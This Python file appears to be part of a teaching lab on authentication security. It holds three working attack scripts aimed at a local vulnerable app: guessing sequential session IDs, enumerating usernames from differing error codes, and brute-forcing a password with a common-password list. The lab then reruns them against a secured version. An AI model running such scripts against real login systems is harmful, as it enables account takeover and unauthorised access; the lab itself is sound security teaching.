"""
attacks.py — D17 Auth Lab
Three scripts targeting vulnerable_auth.py (http://127.0.0.1:5000).
Run against vulnerable_auth.py first, then again unchanged against
secure_auth.py in Step 4.
"""

import requests

BASE = "http://127.0.0.1:5000"


def attack_a_session_guessing():
    print("\n--- Attack A: Session Guessing ---")
    for session_id in range(1, 21):
        r = requests.get(f"{BASE}/dashboard", cookies={"session_id": str(session_id)})
        if "Welcome" in r.text:
            print(f"  ID {session_id}: HIT -> {r.text.strip()[:60]}")
        else:
            print(f"  ID {session_id}: miss")


def attack_b_username_enumeration():
    print("\n--- Attack B: Username Enumeration ---")
    candidates = ["lethabo", "phuti", "admin", "test", "root",
                  "mpho", "tshepo", "omolemo", "mbilu", "guest"]
    for name in candidates:
        r = requests.post(f"{BASE}/login", data={"username": name, "password": "wrongpass123"})
        if r.status_code == 404:
            print(f"  {name}: DOES NOT EXIST ({r.status_code} - {r.text})")
        elif r.status_code == 401:
            print(f"  {name}: EXISTS ({r.status_code} - {r.text})")
        else:
            print(f"  {name}: unexpected ({r.status_code} - {r.text})")


def attack_c_brute_force():
    print("\n--- Attack C: Brute Force ---")
    target_user = "lethabo"
    password_list = ["password", "123456", "qwerty", "letmein", "football",
                      "monkey1", "sunshine1", "dragon", "baseball", "iloveyou"]
    for attempt, pw in enumerate(password_list, start=1):
        r = requests.post(f"{BASE}/login", data={"username": target_user, "password": pw})
        print(f"  Attempt {attempt}: '{pw}' -> {r.status_code}")
        if r.status_code == 302:
            print(f"  SUCCESS on attempt {attempt}: password is '{pw}'")
            break


if __name__ == "__main__":
    attack_a_session_guessing()
    attack_b_username_enumeration()
    attack_c_brute_force()